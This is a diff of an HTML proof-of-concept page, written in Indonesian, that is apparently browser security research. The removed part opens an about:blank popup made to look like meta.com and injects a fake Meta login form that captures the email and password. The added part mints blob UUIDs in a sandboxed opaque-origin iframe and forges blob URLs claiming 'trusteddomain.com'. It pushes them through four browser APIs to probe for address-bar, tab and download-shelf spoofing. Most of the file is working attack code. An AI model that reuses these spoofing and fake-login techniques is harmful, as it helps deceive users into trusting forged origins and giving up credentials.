@@ -1,48 +1,195 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<title>B2 ULTRA — Opaque Mint & Multi-Vector Spoof Probe</title>
+<style>
+ :root{color-scheme:dark}
+ body{font-family:system-ui,"Segoe UI",sans-serif;background:#0d1117;color:#c9d1d9;margin:0;padding:28px;max-width:900px}
+ h1{font-size:20px;margin:0 0 12px} h1 span{color:#f85149}
+ h2{font-size:15px;margin:22px 0 8px;color:#58a6ff}
+ .warn{border:1px solid #f8514933;background:#f851491a;padding:12px 16px;border-radius:8px;font-size:13px;line-height:1.6}
+ .warn code{color:#ffa657;background:#0d1117;padding:2px 4px;border-radius:4px}
+ .card{border:1px solid #30363d;background:#161b22;border-radius:10px;padding:16px;margin-bottom:16px}
+ .card h3{margin:0 0 8px;font-size:14px;color:#58a6ff}
+ .card p{margin:0 0 12px;font-size:12.5px;color:#8b949e;line-height:1.5}
+ button{width:100%;padding:10px;background:#da3633;color:#fff;border:0;border-radius:6px;cursor:pointer;font-weight:600;font-size:13px;transition:0.2s}
+ button:hover{background:#b62324}
+ #log{background:#010409;border:1px solid #30363d;border-radius:8px;padding:12px;height:400px;overflow:auto;font:12px/1.6 'Cascadia Code', Consolas, monospace;white-space:pre-wrap;color:#e6edf3}
+ .log-success{color:#3fb950}
+ .log-warn{color:#d29922}
+ .log-error{color:#f85149}
+ .note{font-size:12.5px;color:#8b949e;line-height:1.6;border:1px solid #30363d;border-radius:8px;padding:12px;background:#161b22;margin-top:16px}
+ .note b{color:#ffa657}
+</style>
+</head>
+<body>
 
+<h1>B2 ULTRA — Opaque Mint & <span>Multi-Vector Spoof</span> Probe</h1>
 
-<center><br><br><br><br><button style=font-size:100px; onclick=x();>Click me
+<div class="warn">
+<b>🧠 Mengapa sebelumnya gagal?</b><br>
+Browser menolak karena <code>BlobURLStore</code> memvalidasi pasangan <code>(origin, uuid)</code>. String palsu ditolak secara <i>silent</i> oleh download manager. <br><br>
+<b>💡 Strategi "Mind-Blowing" Baru:</b><br>
+Kita tidak hanya menggunakan <code>&lt;a&gt; click</code>. Kita akan menyuntikkan URL palsu ke <b>4 Vektor API Browser berbeda</b> (<code>&lt;a&gt;</code>, <code>window.open</code>, <code>&lt;iframe&gt; src</code>, dan <code>location.href</code>). Tujuannya: Memancing <i>UI Leakage</i>. Mungkin download-nya gagal, tapi apakah <i>Address Bar</i> iframe, <i>Tab Title</i>, atau <i>Chrome Error Page</i> secara tidak sengaja menampilkan "trusteddomain.com"? Itulah celah UI Spoofing yang kita cari.
+</div>
 
-    <script>
-    var j='';
-    function x(){
-    j = window.open(`about:blank?https://meta.com`,`j`)
-    
-    setTimeout(() => {
-            j.document.body.innerHTML = `
-              <div style="display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;font-family:Arial, sans-serif;background:#f0f2f5;margin:0;">
-                
-                <!-- Logo -->
-                <div style="margin-bottom:30px;text-align:center;">
-                  <img src="https://registry.npmmirror.com/@lobehub/icons-static-png/latest/files/dark/meta-color.png" alt="Meta Logo" style="width:120px;height:auto;">
-                </div>
-                
-                <!-- Login Card -->
-                <div style="background:white;padding:40px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.15);width:360px;text-align:center;">
-                  <h2 style="margin-bottom:20px;color:#1c1e21;">Log into Meta</h2>
-                  
-                  <input id="user" type="text" placeholder="Email or Phone" 
-                    style="width:100%;padding:12px;margin-bottom:15px;font-size:16px;border:1px solid #ddd;border-radius:6px;">
-                  
-                  <input id="pass" type="password" placeholder="Password" 
-                    style="width:100%;padding:12px;margin-bottom:20px;font-size:16px;border:1px solid #ddd;border-radius:6px;">
-                  
-                  <button onclick="alert('Email/Phone: '+document.getElementById('user').value+'\\nPassword: '+document.getElementById('pass').value)" 
-                    style="width:100%;padding:14px;font-size:18px;background:#1877f2;color:white;border:none;border-radius:6px;cursor:pointer;">
-                    Log In
-                  </button>
-                  
-                  <div style="margin-top:20px;">
-                    <a href="#" style="color:#1877f2;text-decoration:none;font-size:14px;">Forgotten password?</a>
-                  </div>
-                </div>
-                
-                <!-- Footer -->
-                <div style="margin-top:30px;font-size:14px;color:#606770;">
-                  <p>Don't have an account? <a href="#" style="color:#1877f2;text-decoration:none;">Sign up</a></p>
-                </div>
-              </div>
-            `;
-          }, 250);
+<div class="card">
+  <h3>🚀 Jalankan Multi-Vector Spoof Probe</h3>
+  <p>Mint UUID asli dari opaque origin, lalu buat 4 variasi URL palsu. Setiap variasi akan diserang ke 4 API browser berbeda secara bersamaan. Amati log dan UI browser Anda.</p>
+  <button onclick="runUltraProbe()">Jalankan B2 Ultra Probe</button>
+</div>
+
+<h2>🔍 Probe Execution Log</h2>
+<pre id="log"></pre>
+
+<div class="note">
+<b>🎯 Apa yang harus Anda amati (Checklist):</b><br>
+1. <b>Download Shelf:</b> Apakah muncul entri gagal dengan nama "trusteddomain.com"?<br>
+2. <b>New Tab / Popup:</b> Apakah tab baru terbuka dengan URL bar menampilkan `blob:https://trusteddomain.com/...`?<br>
+3. <b>Iframe Error Page:</b> Apakah iframe menampilkan halaman error "This site can't be reached" tetapi dengan URL palsu di address bar-nya?<br>
+4. <b>Window Title:</b> Apakah judul tab browser berubah sementara waktu?
+</div>
+
+<script>
+"use strict";
+
+const $ = (id) => document.getElementById(id);
+const log = (m, type = 'info') => { 
+  const p = $('log'); 
+  const timestamp = new Date().toISOString().slice(11,23);
+  let colorClass = '';
+  if (type === 'success') colorClass = 'log-success';
+  if (type === 'warn') colorClass = 'log-warn';
+  if (type === 'error') colorClass = 'log-error';
+  
+  p.innerHTML += `<span style="opacity:0.6">[${timestamp}]</span> <span class="${colorClass}">${m}</span>\n`; 
+  p.scrollTop = p.scrollHeight; 
+};
+
+// Payload yang akan di-inject ke iframe opaque
+const INNER_SCRIPT = `
+  window.addEventListener("message", function(ev) {
+    if (ev.data && ev.data.cmd === "ultra_probe") {
+      // 1. Mint URL asli untuk mendapatkan UUID yang valid
+      const realUrl = URL.createObjectURL(new Blob(["ULTRA PROBE PAYLOAD"], {type: "text/plain"}));
+      const uuid = realUrl.split("/").pop();
+      
+      // 2. Buat variasi URL palsu (Forged Strings)
+      const forgedUrls = [
+        "blob:https://trusteddomain.com/" + uuid,                  // Vektor A: Origin Spoof Klasik
+        "blob:null/" + uuid + "?redirect=trusteddomain.com",       // Vektor B: Query String Confusion
+        "blob:null/" + uuid + "#trusteddomain.com",                // Vektor C: Fragment/Hash Confusion
+        "blob:null/trusteddomain.com%2f" + uuid                    // Vektor D: URL Encoded Path Spoof
+      ];
+
+      // 3. Kirim kembali ke parent untuk dieksekusi melalui multi-vector
+      parent.postMessage({ 
+        type: "ready_to_spoof", 
+        uuid: uuid, 
+        forgedUrls: forgedUrls,
+        ctxOrigin: String(location.origin)
+      }, "*");
+      
+      // Bersihkan URL asli
+      URL.revokeObjectURL(realUrl);
     }
-    </script>
+  });
+`;
+
+let iframeCtx = null;
+
+function ensureIframe() {
+  if (iframeCtx) return iframeCtx;
+  const f = document.createElement('iframe');
+  // Sandbox ketat: opaque origin, tapi izinkan script dan download
+  f.sandbox = "allow-scripts allow-downloads allow-popups";
+  f.style.cssText = 'width:1px;height:1px;border:0;position:fixed;opacity:0;';
+  f.srcdoc = '<!DOCTYPE html><html><head><title>TrustedDomain.com - Secure Download</title></head><body><script>(' + INNER_SCRIPT + ')<\/script></body></html>';
+  document.body.appendChild(f);
+  iframeCtx = f;
+  return f;
+}
+
+// Listener utama untuk menerima data dari iframe
+window.addEventListener('message', function(ev) {
+  const d = ev.data;
+  if (!d || d.type !== "ready_to_spoof") return;
+
+  log(`✅ Opaque Iframe berhasil mint UUID: ${d.uuid}`, 'success');
+  log(`🎯 Memulai serangan Multi-Vector pada ${d.forgedUrls.length} variasi URL...`, 'warn');
+
+  d.forgedUrls.forEach((forgedUrl, urlIndex) => {
+    log(`\n--- MENGUJI VARIASI #${urlIndex + 1}: ${forgedUrl} ---`, 'info');
     
+    // VECTOR 1: <a> tag download (Standar)
+    try {
+      const a = document.createElement('a');
+      a.href = forgedUrl;
+      a.download = `spoof_vector1_${urlIndex}.txt`;
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+      log(`  [Vector 1: <a> click] Triggered. Cek Download Shelf.`, 'info');
+    } catch(e) {
+      log(`  [Vector 1: <a> click] Blocked by browser: ${e.message}`, 'error');
+    }
+
+    // VECTOR 2: window.open (Memicu Tab/Popup Baru)
+    try {
+      const popup = window.open(forgedUrl, '_blank', 'width=100,height=100');
+      if (popup) {
+        log(`  [Vector 2: window.open] Tab terbuka! Amati Address Bar tab baru tersebut.`, 'success');
+        setTimeout(() => popup.close(), 2000); // Tutup otomatis setelah 2 detik
+      } else {
+        log(`  [Vector 2: window.open] Diblokir oleh Popup Blocker.`, 'error');
+      }
+    } catch(e) {
+      log(`  [Vector 2: window.open] Error: ${e.message}`, 'error');
+    }
+
+    // VECTOR 3: <iframe> src (Memicu Error Page Rendering)
+    try {
+      const testFrame = document.createElement('iframe');
+      testFrame.style.cssText = 'width:300px;height:100px;border:1px solid red;position:fixed;bottom:10px;right:10px;z-index:9999;background:white;';
+      testFrame.src = forgedUrl;
+      document.body.appendChild(testFrame);
+      log(`  [Vector 3: <iframe> src] Iframe visual ditambahkan (kanan bawah). Amati jika menampilkan Error Page dengan URL palsu.`, 'warn');
+      setTimeout(() => testFrame.remove(), 5000); // Hapus setelah 5 detik
+    } catch(e) {
+      log(`  [Vector 3: <iframe> src] Error: ${e.message}`, 'error');
+    }
+
+    // VECTOR 4: location.assign (Memicu Navigasi)
+    // Kita lakukan ini di dalam iframe agar tidak merusak halaman probe utama
+    try {
+      iframeCtx.contentWindow.location.assign(forgedUrl);
+      log(`  [Vector 4: location.assign] Navigasi iframe dipicu.`, 'info');
+      // Kembalikan iframe ke keadaan semula setelah singkat agar probe bisa terus berjalan jika perlu
+      setTimeout(() => {
+         iframeCtx.srcdoc = '<!DOCTYPE html><html><body><script>(' + INNER_SCRIPT + ')<\/script></body></html>';
+      }, 1000);
+    } catch(e) {
+      log(`  [Vector 4: location.assign] Error: ${e.message}`, 'error');
+    }
+  });
+
+  log("\n🏁 Selesai. Silakan periksa UI Browser Anda (Download Shelf, Tab, Address Bar) untuk anomali.", 'success');
+});
+
+function runUltraProbe() {
+  log("🔄 Menginisialisasi Opaque Iframe...", 'info');
+  const f = ensureIframe();
+  
+  // Beri waktu iframe untuk load
+  setTimeout(() => {
+    log("📡 Mengirim perintah 'ultra_probe' ke opaque iframe...", 'info');
+    f.contentWindow.postMessage({ cmd: "ultra_probe" }, "*");
+  }, 500);
+}
+
+log("🛡️ B2 ULTRA Probe siap. Klik tombol untuk memulai eksplorasi multi-vektor.");
+</script>
+
+</body>
+</html>
